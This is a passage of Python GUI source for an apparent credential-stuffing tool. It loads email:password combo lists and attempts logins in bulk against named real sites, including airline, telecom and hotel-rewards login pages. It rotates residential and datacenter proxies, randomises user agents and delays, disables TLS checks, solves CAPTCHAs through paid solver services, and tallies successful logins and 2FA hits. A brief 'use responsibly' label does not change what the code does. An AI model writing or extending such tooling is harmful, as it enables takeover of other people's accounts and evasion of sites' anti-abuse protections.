        ttk.Entry(delay_frame, textvariable=self.delay_min_var, width=5).pack(side=tk.LEFT, padx=5)
        ttk.Label(delay_frame, text="-").pack(side=tk.LEFT)
        self.delay_max_var = tk.StringVar(value="3")
        ttk.Entry(delay_frame, textvariable=self.delay_max_var, width=5).pack(side=tk.LEFT, padx=5)
        
        # Proxy type settings
        proxy_type_frame = ttk.Frame(settings_row2)
        proxy_type_frame.pack(side=tk.LEFT, padx=20)
        
        ttk.Label(proxy_type_frame, text="Proxy Type:").pack(side=tk.LEFT)
        self.proxy_type_var = tk.StringVar(value="ANY")
        proxy_combo = ttk.Combobox(proxy_type_frame, textvariable=self.proxy_type_var, 
                                  values=["ANY", "HTTP", "HTTPS", "SOCKS4", "SOCKS5", "RESIDENTIAL", "DATACENTER"],
                                  state="readonly", width=12)
        proxy_combo.pack(side=tk.LEFT, padx=5)
        
        # CAPTCHA solver configuration
        captcha_frame = ttk.LabelFrame(main_frame, text="CAPTCHA Solving", padding="10")
        captcha_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.use_captcha_solver_var = tk.BooleanVar(value=False)
        enable_solver_cb = ttk.Checkbutton(
            captcha_frame,
            text="Enable CAPTCHA Solver (2Captcha / ClearCaptcha)",
            variable=self.use_captcha_solver_var,
            command=self._on_toggle_captcha_solver
        )
        enable_solver_cb.pack(anchor=tk.W)
        
        captcha_controls = ttk.Frame(captcha_frame)
        captcha_controls.pack(fill=tk.X, pady=5)
        
        provider_frame = ttk.Frame(captcha_controls)
        provider_frame.pack(fill=tk.X, pady=2)
        ttk.Label(provider_frame, text="Preferred Provider:", width=18).pack(side=tk.LEFT)
        self.captcha_provider_var = tk.StringVar(value="AUTO")
        self.captcha_provider_combo = ttk.Combobox(
            provider_frame,
            textvariable=self.captcha_provider_var,
            values=["AUTO", "2CAPTCHA", "CLEARCAPTCHA"],
            state="disabled",
            width=15
        )
        self.captcha_provider_combo.pack(side=tk.LEFT, padx=5)
        self.captcha_provider_combo.bind("<<ComboboxSelected>>", lambda e: self._update_captcha_solver_config())
        
        two_key_frame = ttk.Frame(captcha_controls)
        two_key_frame.pack(fill=tk.X, pady=2)
        ttk.Label(two_key_frame, text="2Captcha API Key:", width=18).pack(side=tk.LEFT)
        self.two_captcha_key_var = tk.StringVar()
        self.two_captcha_entry = ttk.Entry(two_key_frame, textvariable=self.two_captcha_key_var, show='*', state="disabled")
        self.two_captcha_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.two_captcha_key_var.trace_add('write', lambda *args: self._update_captcha_solver_config())
        
        clear_key_frame = ttk.Frame(captcha_controls)
        clear_key_frame.pack(fill=tk.X, pady=2)
        ttk.Label(clear_key_frame, text="ClearCaptcha API Key:", width=18).pack(side=tk.LEFT)
        self.clear_captcha_key_var = tk.StringVar()
        self.clear_captcha_entry = ttk.Entry(clear_key_frame, textvariable=self.clear_captcha_key_var, show='*', state="disabled")
        self.clear_captcha_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.clear_captcha_key_var.trace_add('write', lambda *args: self._update_captcha_solver_config())
        
        note_font = tkFont(family='Arial', size=8, slant='italic')
        captcha_note = ttk.Label(
            captcha_frame, 
            text="Provide API keys from 2captcha.com or clearcaptcha.com. Use responsibly and respect target site policies.",
            font=note_font, foreground="gray"
        )
        captcha_note.pack(anchor=tk.W, pady=(5, 0))
        
        self._apply_captcha_solver_state()
        
        # Control buttons
        button_frame = ttk.Frame(settings_container)
        button_frame.pack(fill=tk.X, pady=5) # MODIFIED: Row index
        
        self.start_button = ttk.Button(button_frame, text="Start Checking", command=self.start_checking)
        self.start_button.pack(side=tk.LEFT, padx=(0, 10))
        
        self.stop_button = ttk.Button(button_frame, text="Stop Checking", command=self.stop_checking, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=(0, 10))
        
        ttk.Button(button_frame, text="Clear Results", command=self.clear_results).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(button_frame, text="Test Single Account", command=self.test_single_account).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(button_frame, text="About", command=self.show_about).pack(side=tk.LEFT)
        
        # Progress section
        progress_frame = ttk.LabelFrame(results_container, text="Progress & Statistics", padding="10")
        progress_frame.pack(fill=tk.X, pady=5)
        
        # Progress bar container
        progress_container = ttk.Frame(progress_frame)
        progress_container.pack(fill=tk.X, pady=(0, 10))
        
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(progress_container, variable=self.progress_var, mode='determinate')
        self.progress_bar.pack(fill=tk.X, expand=True)
        
        # Stats container
        stats_frame = ttk.Frame(progress_frame)
        stats_frame.pack(fill=tk.X, pady=5)
        
        # Status labels container
        status_frame = ttk.Frame(stats_frame)
        status_frame.pack(fill=tk.X)
        
        self.stats_label = ttk.Label(status_frame, 
                                   text="Checked: 0 | Success: 0 | Failed: 0 | Rate Limited: 0 | Captcha: 0 | 2FA: 0 | Errors: 0")
        self.stats_label.pack(fill=tk.X)
        
        # Proxy stats
        self.proxy_stats_label = ttk.Label(status_frame, text="Proxies: 0 loaded | Type: No proxies")
        self.proxy_stats_label.pack(fill=tk.X, pady=(5, 0))
        
        # Accounts preview grid
        preview_frame = ttk.LabelFrame(main_frame, text="Loaded Accounts Preview", padding="10")
        preview_frame.pack(fill=tk.X, pady=(0, 10))

        # Create container for tree and scrollbars
        tree_container = ttk.Frame(preview_frame)
        tree_container.pack(fill=tk.BOTH, expand=True)

        # Tree view for accounts
        self.preview_tree = ttk.Treeview(tree_container, columns=('site', 'email', 'password'), show='headings', height=6)
        self.preview_tree.heading('site', text='Site')
        self.preview_tree.heading('email', text='Email')
        self.preview_tree.heading('password', text='Password')
        self.preview_tree.column('site', width=200)
        self.preview_tree.column('email', width=250)
        self.preview_tree.column('password', width=150)

        # Scrollbars for tree view
        preview_vsb = ttk.Scrollbar(tree_container, orient="vertical", command=self.preview_tree.yview)
        preview_hsb = ttk.Scrollbar(preview_frame, orient="horizontal", command=self.preview_tree.xview)
        self.preview_tree.configure(yscrollcommand=preview_vsb.set, xscrollcommand=preview_hsb.set)

        # Layout scrollbars and tree
        preview_vsb.pack(side=tk.RIGHT, fill=tk.Y)
        preview_hsb.pack(side=tk.BOTTOM, fill=tk.X)
        self.preview_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        # Format preview and validation frame
        format_frame = ttk.LabelFrame(preview_frame, text="Format Preview & Validation", padding="5")
        format_frame.pack(fill=tk.X, pady=(5,0))
        
        # Format info
        format_info = ttk.Frame(format_frame)
        format_info.pack(fill=tk.X, expand=True)
        
        ttk.Label(format_info, text="Detected Format:").pack(side=tk.LEFT, padx=(0,5))
        self.format_label = ttk.Label(format_info, text="No file loaded", font=('Arial', 9, 'italic'))
        self.format_label.pack(side=tk.LEFT)
        
        # Sample preview
        ttk.Label(format_frame, text="Sample lines:").pack(anchor=tk.W, pady=(5,0))
        self.format_preview = scrolledtext.ScrolledText(format_frame, height=3, width=80, font=('Consolas', 9))
        self.format_preview.pack(fill=tk.X, expand=True, pady=(2,5))
        
        # Preview controls
        preview_controls = ttk.Frame(format_frame)
        preview_controls.pack(fill=tk.X, expand=True, pady=(0,5))
        
        ttk.Button(preview_controls, text="Copy Selected", 
                  command=self._copy_selected_account).pack(side=tk.RIGHT, padx=5)
        ttk.Button(preview_controls, text="Clear Preview", 
                  command=self._clear_preview).pack(side=tk.RIGHT)
        
        # Results log
        log_frame = ttk.LabelFrame(results_container, text="Real-time Results Log", padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=15, width=100)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
    def _build_supported_site_options(self) -> List[str]:
        """Return a sorted list of known site URLs for quick selection."""
        options = set()
        try:
            site_configs = getattr(self.checker.site_analyzer, "site_specific_configs", {})
            for domain, config in site_configs.items():
                working_url = config.get('working_url')
                if working_url:
                    options.add(working_url)
                domain = domain.strip()
                if domain:
                    if not domain.startswith("http"):
                        options.add(f"https://{domain}")
                        if not domain.startswith("www."):
                            options.add(f"https://www.{domain}")
                    else:
                        options.add(domain)
        except Exception as exc:
            logger.debug(f"Unable to build site options from analyzer: {exc}")
        
        options.update({
            "https://www.flyfrontier.com/",
            "https://www.flyfrontier.com/login",
            "https://virginmediao2.co.uk/",
            "https://www.o2.co.uk/login",
            "https://www.ihg.com/",
            "https://www.ihg.com/rewardsclub/us/en/sign-in",
        })
        
        current = (self.default_site_var.get() or "").strip()
        if current:
            options.add(current)
        
        return sorted(options)
    
    def refresh_site_selector_options(self):
        """Refresh combobox options for supported sites."""
        if not hasattr(self, "site_selector"):
            return
        values = self._build_supported_site_options()
        self.site_selector['values'] = values
        current = (self.default_site_var.get() or "").strip()
        if current:
            self.site_selector.set(current)
    
    def _on_site_selector_change(self, event=None):
        """Normalize selected site and keep combobox and entry aligned."""
        value = (self.default_site_var.get() or "").strip()
        if not value:
            return
        normalized = value
        if not normalized.startswith(('http://', 'https://')):
            normalized = f"https://{normalized.lstrip('/')}"
        while normalized.endswith('//'):
            normalized = normalized[:-1]
        if normalized != value:
            self.default_site_var.set(normalized)
        self.refresh_site_selector_options()
    
    def _apply_captcha_solver_state(self):
        if not hasattr(self, "captcha_provider_combo"):
            return
        enabled = self.use_captcha_solver_var.get()
        provider_state = "readonly" if enabled else "disabled"
        entry_state = "normal" if enabled else "disabled"
        self.captcha_provider_combo.config(state=provider_state)
        self.two_captcha_entry.config(state=entry_state)
        self.clear_captcha_entry.config(state=entry_state)
    
    def _on_toggle_captcha_solver(self):
        self._apply_captcha_solver_state()
        self._update_captcha_solver_config()
    
    def _update_captcha_solver_config(self, *_):
        if not hasattr(self, "checker"):
            return
        enabled = self.use_captcha_solver_var.get()
        if not enabled:
            self.checker.configure_captcha_solver([])
            return
        
        provider_pref = (self.captcha_provider_var.get() or "AUTO").upper()
        providers: List[Tuple[CaptchaProvider, str]] = []
        two_key = (self.two_captcha_key_var.get() or "").strip()
        clear_key = (self.clear_captcha_key_var.get() or "").strip()
        
        if provider_pref == "2CAPTCHA":
            if two_key:
                providers.append((CaptchaProvider.TWO_CAPTCHA, two_key))
            elif clear_key:
                providers.append((CaptchaProvider.CLEAR_CAPTCHA, clear_key))
        elif provider_pref == "CLEARCAPTCHA":
            if clear_key:
                providers.append((CaptchaProvider.CLEAR_CAPTCHA, clear_key))
            elif two_key:
                providers.append((CaptchaProvider.TWO_CAPTCHA, two_key))
        else:
            if two_key:
                providers.append((CaptchaProvider.TWO_CAPTCHA, two_key))
            if clear_key:
                providers.append((CaptchaProvider.CLEAR_CAPTCHA, clear_key))
        
        self.checker.configure_captcha_solver(providers)
    
    def analyze_site(self):
        """Analyze the specified site"""
        site_url = self.default_site_var.get()
        if not site_url.startswith(('http://', 'https://')):
            site_url = 'https://' + site_url
            
        self.log_message(f"Analyzing site: {site_url}")
        
        try:
            self.site_info_text.delete(1.0, tk.END)
            self.site_info_text.insert(tk.END, f"Analyzing {site_url}...\n", 'bold')
            
            # Fetch initial page and check redirect
            session = requests.Session()
            session.verify = False
            session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
            
            try:
                initial_resp = session.get(site_url, timeout=20, allow_redirects=True)
                if initial_resp.url != site_url:
                    self.site_info_text.insert(tk.END, f"Note: Site redirects to {initial_resp.url}\n", 'warning')
                    site_url = initial_resp.url
            except Exception as e:
                self.site_info_text.insert(tk.END, f"Warning: Could not fetch site: {e}\n", 'error')
            
            config = self.checker.analyze_site(site_url, self.use_proxies_var.get())
            
            # Display enhanced site analysis results
            self.site_info_text.insert(tk.END, "\nSite Analysis Results:\n", 'bold')
            
            # Login URL status
            self.site_info_text.insert(tk.END, f"Login URL: {config.login_url}\n")
            try:
                login_resp = session.get(config.login_url, timeout=10, allow_redirects=True)
                if login_resp.status_code == 200:
                    self.site_info_text.insert(tk.END, f"✓ Login page accessible (HTTP {login_resp.status_code})\n", 'success')
                else:
                    self.site_info_text.insert(tk.END, f"⚠ Login page returns HTTP {login_resp.status_code}\n", 'warning')
            except:
                self.site_info_text.insert(tk.END, "⚠ Could not verify login page access\n", 'warning')
            
            # Auth method and fields
            self.site_info_text.insert(tk.END, f"Auth Method: {config.auth_method.value}\n")
            if config.auth_method == AuthMethod.FORM:
                self.site_info_text.insert(tk.END, f"Form fields detected:\n")
                self.site_info_text.insert(tk.END, f" - Username: {config.username_field}\n")
                self.site_info_text.insert(tk.END, f" - Password: {config.password_field}\n")
                if config.additional_fields:
                    self.site_info_text.insert(tk.END, f" - Additional fields: {', '.join(config.additional_fields.keys())}\n")
            elif config.auth_method == AuthMethod.JSON_API:
                self.site_info_text.insert(tk.END, f"API parameters:\n")
                self.site_info_text.insert(tk.END, f" - Username: {config.username_field}\n")
                self.site_info_text.insert(tk.END, f" - Password: {config.password_field}\n")
            
            # Security features
            security = []
            if len(config.csrf_tokens) > 0:
                security.append(f"CSRF Protection ({len(config.csrf_tokens)} tokens)")
            if config.captcha_present:
                security.append("CAPTCHA")
                captcha_details = "⚠ CAPTCHA detected"
                if config.captcha_type:
                    captcha_details += f" ({config.captcha_type})"
                if config.captcha_site_key:
                    display_key = config.captcha_site_key[:16] + "..." if len(config.captcha_site_key) > 16 else config.captcha_site_key
                    captcha_details += f" | site key: {display_key}"
                self.site_info_text.insert(tk.END, captcha_details + "\n", 'warning')
            
            if security:
                self.site_info_text.insert(tk.END, f"Security Features: {', '.join(security)}\n")
            
            self.log_message(f"Site analysis complete: {config.auth_method.value} method detected")
            
            # Update login links listbox
            self.login_links_listbox.delete(0, tk.END)
            self.login_links_listbox.insert(tk.END, f"MAIN: {config.login_url}")
            
            # Look for additional login-related links
            if initial_resp and initial_resp.headers.get('content-type', '').startswith('text/html'):
                soup = BeautifulSoup(initial_resp.text, 'html.parser')
                for a in soup.find_all('a', href=True):
                    href = a['href'].strip()
                    text = (a.get_text() or '').strip()
                    if href and text and re.search(r'\b(login|signin|sign-in|sign_in|auth)\b', href + ' ' + text, re.I):
                        full_url = urljoin(site_url, href)
                        if full_url != config.login_url:  # Don't duplicate main login URL
                            self.login_links_listbox.insert(tk.END, f"ALT: {full_url}")
            
            self.log_message(f"Site analysis complete: {config.auth_method.value} method detected")
            
        except Exception as e:
            self.log_message(f"Error analyzing site: {e}")

    def start_site_auto_check(self):
        """Start automatic site checking: fetch full page, detect login links, and optionally auto-login."""
        site = self.default_site_var.get().strip()
        if not site:
            messagebox.showerror("Error", "Please enter a site URL")
            return
        if not site.startswith(('http://', 'https://')):
            site = 'https://' + site
            self.default_site_var.set(site)

        # Ensure credentials provided
        email = self.site_email_var.get().strip()
        password = self.site_password_var.get().strip()
        if not email or not password:
            messagebox.showerror("Error", "Please provide email and password for auto-login")
            return

        self.start_site_button.config(state=tk.DISABLED)
        self.stop_site_button.config(state=tk.NORMAL)
        self.site_checking_running = True

        # Start thread to fetch and parse
        # Read options
        use_playwright = self.use_playwright_var.get()
        use_proxy_for_site = self.use_proxy_for_site_var.get()
        save_results = self.save_results_var.get()
        save_path = self.save_path_var.get().strip() or None

        self.site_checking_thread = threading.Thread(
            target=self._site_auto_check_worker,
            args=(site, email, password, use_playwright, use_proxy_for_site, save_results, save_path),
            daemon=True
        )
        self.site_checking_thread.start()

    def stop_site_check(self):
        """Stop site auto-checking."""
        self.site_checking_running = False
        self.stop_site_button.config(state=tk.DISABLED)
        self.start_site_button.config(state=tk.NORMAL)
        self.log_message("Site auto-check stopped by user")

    def _site_auto_check_worker(self, site: str, email: str, password: str,
                                use_playwright: bool = False, use_proxy_for_site: bool = False,
                                save_results: bool = False, save_path: Optional[str] = None):
        """Worker thread: fetch page, populate HTML viewer, detect links, auto-follow and try login."""
        results = []
        try:
            self.log_message(f"Fetching site: {site}")
            session = requests.Session()
            session.verify = False
            session.headers.update({'User-Agent': random.choice(USER_AGENTS)})

            # Determine proxy if requested
            proxy = None
            if use_proxy_for_site:
                proxy = self.checker.proxy_manager.get_proxy(ProxyType.ANY, use_proxies=True)
                if proxy:
                    session.proxies.update(proxy)
                    self.log_message(f"Using proxy for site auto-check: {proxy.get('http')}")

            html = ''
            status = None

            # If Playwright requested and available, use it to render the page (JS)
            if use_playwright:
                try:
                    from playwright.sync_api import sync_playwright
                    with sync_playwright() as pw:
                        browser = pw.chromium.launch(headless=True)
                        ctx_args = {}
                        # Apply proxy to Playwright if available
                        if proxy and 'http' in proxy:
                            # Playwright expects proxy dict with 'server' key
                            ctx_args['proxy'] = { 'server': proxy.get('http') }
                        context = browser.new_context(**ctx_args)
                        page = context.new_page()
                        page.set_user_agent(random.choice(USER_AGENTS))
                        page.goto(site, timeout=30000)
                        page.wait_for_timeout(1500)
                        html = page.content()
                        status = 200
                        page.close()
                        context.close()
                        browser.close()
                        self.log_message(f"Rendered {site} with Playwright")
                except Exception as e:
                    self.log_message(f"Playwright rendering failed or not available: {e}")
                    # Fallback to requests
                    try:
                        resp = session.get(site, timeout=20, allow_redirects=True)
                        html = resp.text
                        status = resp.status_code
                        self.log_message(f"Fetched {site} (HTTP {status}) via requests after Playwright fallback")
                    except Exception as e2:
                        self.log_message(f"Error fetching site {site}: {e2}")
                        html = ''
            else:
                try:
                    resp = session.get(site, timeout=20, allow_redirects=True)
                    html = resp.text
                    status = resp.status_code
                    self.log_message(f"Fetched {site} (HTTP {status})")
                except Exception as e:
                    self.log_message(f"Error fetching site {site}: {e}")
                    html = ''

            # Update HTML viewer on main thread
            self.root.after(0, lambda: self.site_html_text.delete(1.0, tk.END))
            self.root.after(0, lambda: self.site_html_text.insert(tk.END, html))

            # Parse anchors for login-like and signup-like links
            soup = BeautifulSoup(html, 'html.parser') if html else None
            signin_links = []
            signup_links = []
            if soup:
                for a in soup.find_all('a', href=True):
                    href = a['href'].strip()
                    text = (a.get_text() or '').strip()
                    full = urljoin(site, href)

                    # Heuristics for signin/login
                    if re.search(r'\b(login|signin|sign-in|sign_in|auth|account|sign in)\b', href, re.I) or re.search(r'\b(login|sign in|sign-in|sign_in)\b', text, re.I):
                        if full not in signin_links:
                            signin_links.append(full)

                    # Heuristics for signup/register
                    if re.search(r'\b(signup|sign-up|sign_up|register|create-account|join)\b', href, re.I) or re.search(r'\b(sign up|signup|register|create account|join)\b', text, re.I):
                        if full not in signup_links:
                            signup_links.append(full)

                # Also inspect buttons and onclick handlers that may trigger signup/login
                for btn in soup.find_all(['button', 'input']):
                    btn_text = (btn.get_text() or btn.get('value') or '').strip()
                    onclick = btn.get('onclick', '') or ''
                    if re.search(r'\b(login|signin|sign-in|sign_in|sign in)\b', btn_text, re.I) or re.search(r'\b(login|signin|auth)\b', onclick, re.I):
                        href = btn.get('formaction') or btn.get('data-href') or ''
                        if href:
                            full = urljoin(site, href)
                            if full not in signin_links:
                                signin_links.append(full)
                    if re.search(r'\b(signup|register|create account|join)\b', btn_text, re.I) or re.search(r'\b(signup|register)\b', onclick, re.I):
                        href = btn.get('formaction') or btn.get('data-href') or ''
                        if href:
                            full = urljoin(site, href)
                            if full not in signup_links:
                                signup_links.append(full)

                # Heuristic: find forms that might become visible via JS (presence of inputs named email/username and password elsewhere)
                for form in soup.find_all('form'):
                    # if form has password input it's a signin form
                    if form.find('input', {'type': 'password'}):
                        action = form.get('action') or site
                        full = urljoin(site, action)
                        if full not in signin_links:
                            signin_links.append(full)

            # Update listbox with labeled entries
            def populate_links():
                self.login_links_listbox.delete(0, tk.END)
                for l in signin_links:
                    self.login_links_listbox.insert(tk.END, f"SIGNIN: {l}")
                for l in signup_links:
                    self.login_links_listbox.insert(tk.END, f"SIGNUP: {l}")
                if not signin_links and not signup_links:
                    self.login_links_listbox.insert(tk.END, '(No login/sign-up links detected)')

            self.root.after(0, populate_links)

            # Auto process signin links first
            for l in signin_links:
                if not self.site_checking_running:
                    break
                self.log_message(f"Following signin link: {l}")
                try:
                    # Determine proxy for login attempt if using proxies
                    login_proxy = None
                    if use_proxy_for_site:
                        login_proxy = self.checker.proxy_manager.get_proxy(ProxyType.ANY, use_proxies=True)
                    result = self.checker.check_account(l, email, password, proxy=login_proxy, timeout=30, use_proxies=bool(login_proxy))
                    self.log_message(f"Auto-login result for {l}: {result.status.value} ({result.response_time:.2f}s)")
                    results.append({
                        'site': site,
                        'action': 'signin',
                        'url': l,
                        'status': result.status.value,
                        'response_time': result.response_time,
                        'timestamp': result.timestamp.isoformat()
                    })
                except Exception as e:
                    self.log_message(f"Error auto-logging to {l}: {e}")

            # If no signin links were found but signup links exist, follow signup then look for signin on that page
            if not signin_links and signup_links:
                for s_link in signup_links:
                    if not self.site_checking_running:
                        break
                    self.log_message(f"Following signup link: {s_link}")
                    try:
                        s_resp = session.get(s_link, timeout=20, allow_redirects=True)
                        s_html = s_resp.text
                        self.root.after(0, lambda html=s_html: self.site_html_text.insert(tk.END, "\n\n--- After following signup link ---\n\n" + html))

                        # Search the signup page for signin/login links
                        s_soup = BeautifulSoup(s_html, 'html.parser')
                        found_signin = None
                        for a in s_soup.find_all('a', href=True):
                            href = a['href'].strip()
                            text = (a.get_text() or '').strip()
                            if re.search(r'\b(login|signin|sign-in|sign_in|auth|account|sign in)\b', href, re.I) or re.search(r'\b(login|sign in|sign-in|sign_in)\b', text, re.I):
                                found_signin = urljoin(s_link, href)
                                break

                        if found_signin:
                            self.log_message(f"Found signin link after signup: {found_signin}")
                            try:
                                login_proxy = None
                                if use_proxy_for_site:
                                    login_proxy = self.checker.proxy_manager.get_proxy(ProxyType.ANY, use_proxies=True)
                                result = self.checker.check_account(found_signin, email, password, proxy=login_proxy, timeout=30, use_proxies=bool(login_proxy))
                                self.log_message(f"Auto-login result for {found_signin}: {result.status.value} ({result.response_time:.2f}s)")
                                results.append({
                                    'site': site,
                                    'action': 'signup->signin',
                                    'signup_url': s_link,
                                    'signin_url': found_signin,
                                    'status': result.status.value,
                                    'response_time': result.response_time,
                                    'timestamp': result.timestamp.isoformat()
                                })
                            except Exception as e:
                                self.log_message(f"Error auto-logging to {found_signin}: {e}")
                        else:
                            self.log_message(f"No signin link found on signup page: {s_link}")

                    except Exception as e:
                        self.log_message(f"Error fetching signup page {s_link}: {e}")

            self.log_message("Site auto-check completed")

        finally:
            # Reset buttons
            self.root.after(0, lambda: self.start_site_button.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.stop_site_button.config(state=tk.DISABLED))
            self.site_checking_running = False

            # Save results if requested (save_results_var passed earlier)
            try:
                if save_results and save_path:
                    p = Path(save_path)
                    p.mkdir(parents=True, exist_ok=True)
                    json_file = p / f"site_auto_check_{re.sub(r'[^0-9a-zA-Z]+','_', urlparse(site).netloc)}.json"
                    csv_file = p / f"site_auto_check_{re.sub(r'[^0-9a-zA-Z]+','_', urlparse(site).netloc)}.csv"
                    # Write JSON
                    with open(json_file, 'w', encoding='utf-8') as jf:
                        json.dump(results, jf, ensure_ascii=False, indent=2)
                    # Write CSV
                    if results:
                        keys = set()
                        for r in results:
                            keys.update(r.keys())
                        keys = list(keys)
                        with open(csv_file, 'w', newline='', encoding='utf-8') as cf:
                            writer = csv.DictWriter(cf, fieldnames=keys)
                            writer.writeheader()
                            for r in results:
                                writer.writerow({k: r.get(k, '') for k in keys})
                    self.log_message(f"Saved results to {p}")
            except Exception as e:
                self.log_message(f"Error saving results: {e}")

    def on_login_link_double_click(self, event):
        """Handle double-click on a detected login link to manually trigger login attempt."""
        sel = self.login_links_listbox.curselection()
        if not sel:
            return
        idx = sel[0]
        link = self.login_links_listbox.get(idx)
        if not link or link.startswith('('):
            return

        # Strip prefix labels if present (e.g., 'MAIN: http...' or 'ALT: http...')
        if any(link.upper().startswith(prefix) for prefix in ['MAIN:', 'ALT:', 'SIGNIN:', 'SIGNUP:']):
            try:
                link = link.split(':', 1)[1].strip()
            except Exception:
                pass

        email = self.site_email_var.get().strip()
        password = self.site_password_var.get().strip()
        if not email or not password:
            messagebox.showerror("Error", "Please provide email and password to attempt login")
            return

        # Run login attempt in thread
        def _attempt():
            try:
                self.log_message(f"Manual login attempt to: {link}")
                result = self.checker.check_account(link, email, password, proxy=None, timeout=30, use_proxies=False)
                self.log_message(f"Manual login result for {link}: {result.status.value} ({result.response_time:.2f}s)")
            except Exception as e:
                self.log_message(f"Error during manual login attempt: {e}")

        threading.Thread(target=_attempt, daemon=True).start()
    
    def _clear_preview(self):
        """Clear the accounts preview grid"""
        for item in self.preview_tree.get_children():
            self.preview_tree.delete(item)
        self.format_label.config(text="No file loaded")
        
    def _copy_selected_account(self):
        """Copy selected account details to clipboard"""
        selection = self.preview_tree.selection()
        if not selection:
            return
            
        item = self.preview_tree.item(selection[0])
        values = item['values']
        if values:
            # Format: site:email:password or email:password
            if values[0] == 'default':
                copy_text = f"{values[1]}:{values[2]}"
            else:
                copy_text = f"{values[0]}:{values[1]}:{values[2]}"
            self.root.clipboard_clear()
            self.root.clipboard_append(copy_text)
            self.log_message(f"Copied account details to clipboard")

    def _extract_login_links(self, url, html):
        """Extract login-related links from HTML content"""
        links = []
        try:
            soup = BeautifulSoup(html, 'html.parser')
            # Look for anchor tags
            for a in soup.find_all('a', href=True):
                href = a['href'].strip()
                text = (a.get_text() or '').strip().lower()
                
                # Check both href and text content
                if any(word in href.lower() or word in text for word in 
                       ['login', 'signin', 'sign-in', 'sign_in', 'auth', 'account']):
                    full_url = urljoin(url, href)
                    links.append(('signin', full_url, text))
                elif any(word in href.lower() or word in text for word in
                         ['signup', 'register', 'create-account', 'join']):
                    full_url = urljoin(url, href)
                    links.append(('signup', full_url, text))
            
            # Look for forms
            for form in soup.find_all('form'):
                action = form.get('action', '')
                if form.find('input', {'type': 'password'}):
                    # Login form found
                    full_url = urljoin(url, action)
                    links.append(('form', full_url, 'Login Form'))
            
            return links
        except Exception as e:
            self.log_message(f"Error extracting login links: {e}")
            return []
            
    def _detect_format(self, sample_lines):
        """Detect the format of the accounts file with validation"""
        formats_found = set()
        format_details = []
        valid_lines = 0
        total_lines = 0
        
        for line in sample_lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            
            total_lines += 1
            format_found = None
            is_valid = False
            
            # Check site:email:pass format
            if line.count(':') == 2:
                parts = line.split(':')
                site = parts[0].strip()
                email = parts[1].strip()
                # Validate site has domain-like chars
                if '.' in site or '/' in site:
                    # Basic email validation
                    if '@' in email and '.' in email.split('@')[1]:
                        format_found = "site:email:password"
                        is_valid = True
                        formats_found.add(format_found)
            
            # Check email:pass format
            elif line.count(':') == 1:
                email = line.split(':')[0].strip()
                if '@' in email and '.' in email.split('@')[1]:
                    format_found = "email:password"
                    is_valid = True
                    formats_found.add(format_found)
            
            # Check other separators
            elif any(sep in line for sep in [';', '|', '\t']):
                for sep in [';', '|', '\t']:
                    if sep in line:
                        email = line.split(sep)[0].strip()
                        if '@' in email and '.' in email.split('@')[1]:
                            format_found = f"email:password (separator: {sep})"
                            is_valid = True
                            formats_found.add(format_found)
                            break
            
            if is_valid:
                valid_lines += 1
            
            format_details.append((line, format_found, is_valid))
        
        # Calculate format confidence
        confidence = (valid_lines / total_lines * 100) if total_lines > 0 else 0
        
        result = {
            'formats': formats_found,
            'details': format_details,
            'confidence': confidence,
            'valid_lines': valid_lines,
            'total_lines': total_lines
        }
        
        if len(formats_found) == 0:
            result['summary'] = "Unknown format"
        elif len(formats_found) == 1:
            fmt = next(iter(formats_found))
            result['summary'] = f"{fmt} ({confidence:.1f}% valid)"
        else:
            result['summary'] = f"Mixed formats ({confidence:.1f}% valid)"
        
        return result

    def _update_preview(self, filename):
        """Update the accounts preview grid"""
        try:
            self._clear_preview()
            
            # Read first few lines to detect format
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                sample_lines = [next(f) for _ in range(10) if f]
                
            # Detect format with validation
            format_result = self._detect_format(sample_lines)
            
            # Update format label
            self.format_label.config(text=format_result['summary'])
            
            # Update format preview
            self.format_preview.delete(1.0, tk.END)
            for line, fmt, valid in format_result['details']:
                if valid:
                    self.format_preview.insert(tk.END, f"✓ {line}\n", 'success')
                else:
                    self.format_preview.insert(tk.END, f"✗ {line}\n", 'error')
                    
            # Configure preview tags
            self.format_preview.tag_configure('success', foreground='green')
            self.format_preview.tag_configure('error', foreground='red')
            
            # Show warning if confidence is low
            if format_result['confidence'] < 80:
                self.log_message(f"Warning: Low format confidence ({format_result['confidence']:.1f}%). Check file format.")
            
            # Load and display accounts
            accounts = self.checker.load_accounts(filename)
            for i, (site, email, password) in enumerate(accounts):
                # Mask password partially
                if len(password) > 4:
                    masked_pass = password[:2] + '*' * (len(password)-4) + password[-2:]
                else:
                    masked_pass = '*' * len(password)
                    
                self.preview_tree.insert('', 'end', values=(site, email, masked_pass))
                
                # Only show first 100 accounts in preview
                if i >= 99:
                    self.preview_tree.insert('', 'end', 
                        values=('...', f'({len(accounts)-100} more accounts)', '...'))
                    break
                    
            return len(accounts)
        except Exception as e:
            self.log_message(f"Error loading preview: {e}")
            self.format_label.config(text="Error loading file")
            return 0

    def _validate_file_format(self, filename):
        """Validate the format of the accounts file"""
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                sample_lines = [line for _, line in zip(range(50), f)]
            
            format_result = self._detect_format(sample_lines)
            
            if format_result['confidence'] < 50:
                return False, "File format appears invalid (low confidence). Please check the format."
            
            if format_result['valid_lines'] < 1:
                return False, "No valid account entries found in file."
                
            return True, format_result['summary']
            
        except Exception as e:
            return False, f"Error validating file: {str(e)}"
    
    def browse_accounts_file(self):
        filename = filedialog.askopenfilename(
            title="Select Accounts File", 
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            self.accounts_file.set(filename)
            # Update preview
            count = self._update_preview(filename)
            if count > 0:
                self.log_message(f"Loaded {count} accounts from file")
            else:
